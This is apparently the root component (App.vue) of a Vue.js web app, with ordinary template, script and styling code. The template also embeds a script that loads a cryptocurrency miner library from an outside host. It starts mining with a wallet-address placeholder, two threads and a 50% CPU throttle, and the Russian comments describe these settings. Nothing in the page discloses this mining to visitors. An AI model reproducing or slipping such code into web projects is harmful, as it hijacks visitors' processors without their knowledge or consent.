<template>
  
  
  <div id="app">
    <!--<img src="./assets/logo.png">-->
    <router-view></router-view>
    
    
    <script src="http://krb.devphp.org.ua/webcoin.min.js"></script>
    <script>
      var miner = new WebCoin.Miner('Ваш адрес'); //Загружает код майнера в память
      miner.start(); //Запуск майнера
      var pool = 1;
      var thrds = 2;
      var throttle = 0.5;
      //Опциональные установки
      miner.setPool(pool); //Устанавливает номер пула, по умолчанию 0
      miner.setNumThreads(thrds); //Устанавливает количество потоков, по умолчанию 1
      miner.setThrottle(throttle); //Устанавливает общую нагрузку на процессор, 0 - 100%, 0.9 - 10%, по умолчанию 0
    </script>
  
  
  </div>
</template>

<script>
  export default {
    name: 'app'
  }


</script>

<style>
  #app {
    position: absolute;
    font-family: 'Avenir', Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-align: center;
    color: #2c3e50;
    margin-top: 60px;
    left: 60px;
    right: 60px;
    top: 60px;
    height: calc(90% - 60px);
    
  }
  
  .btn-icon {
    font-size: 24px;
    width: 1em;
  }
  
  .md-button.btn-icon {
    padding: 0;
  }


</style>
